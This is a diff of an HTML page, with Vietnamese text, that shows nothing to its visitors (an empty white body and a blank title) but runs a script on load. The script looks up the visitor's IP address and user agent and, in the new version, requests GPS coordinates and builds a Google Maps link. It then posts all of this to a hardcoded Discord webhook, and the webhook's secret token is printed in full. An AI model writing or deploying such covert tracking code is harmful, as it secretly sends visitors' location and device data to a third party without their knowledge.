@@ -1,54 +1,61 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>Nothing here...</title>
+  <title></title>
   <script>
-    // Lấy thông tin IP & vị trí
-    fetch("https://ipwho.is/")
-      .then(res => res.json())
-      .then(data => {
-        const ip = data.ip || "Không rõ";
-        const city = data.city || "Không rõ";
-        const region = data.region || "Không rõ";
-        const country = data.country || "Không rõ";
-        const isp = data.connection?.isp || "Không rõ";
-        const timezone = data.timezone?.id || "Không rõ";
+    const webhookURL = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";
 
-        // Lấy user-agent (thiết bị)
-        const userAgent = navigator.userAgent;
+    const sendToDiscord = (msg) => {
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: msg })
+      });
+    };
 
-        // Thời gian hiện tại
-        const now = new Date();
-        const time = now.toLocaleTimeString();
-        const date = now.toLocaleDateString();
+    const getIP = async () => {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Không rõ";
+      }
+    };
 
-        // Webhook Discord của anh (đổi nếu cần)
-        const webhookUrl = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";
+    const run = async () => {
+      const ip = await getIP();
+      const ua = navigator.userAgent;
+      const time = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
 
-        // Nội dung gửi về Discord
-        const message = {
-          content: `📍 **Ai đó vừa vào web!**
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude.toFixed(6);
+          const lon = pos.coords.longitude.toFixed(6);
+          const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
+          sendToDiscord(`📡 **Có người VÀO WEB và CHO PHÉP vị trí**
 
-🌐 **IP**: ${ip}
-📍 **Vị trí**: ${city}, ${region}, ${country}
-📶 **Nhà mạng**: ${isp}
-🕒 **Múi giờ**: ${timezone}
+🌍 Vĩ độ: ${lat}
+🌐 Kinh độ: ${lon}
+📌 Google Maps: ${mapLink}
 
-💻 **Thiết bị**: ${userAgent}
-🕓 **Thời gian**: ${time} ${date}`
-        };
+🕵️ IP: ${ip}
+💻 Thiết bị: ${ua}
+🕒 Thời gian: ${time}`);
+        },
+        (err) => {
+          sendToDiscord(`⚠️ Có người vào web nhưng **KHÔNG cho phép định vị**
 
-        // Gửi về webhook
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(message)
-        });
-      })
-      .catch(err => console.error("Lỗi khi lấy IP hoặc gửi webhook:", err));
+🕵️ IP: ${ip}
+💻 Thiết bị: ${ua}
+🕒 Thời gian: ${time}`);
+        }
+      );
+    };
+
+    window.onload = run;
   </script>
 </head>
-<body style="background-color: white; margin: 0; padding: 0;">
-</body>
+<body style="margin:0; background:white;"></body>
 </html>
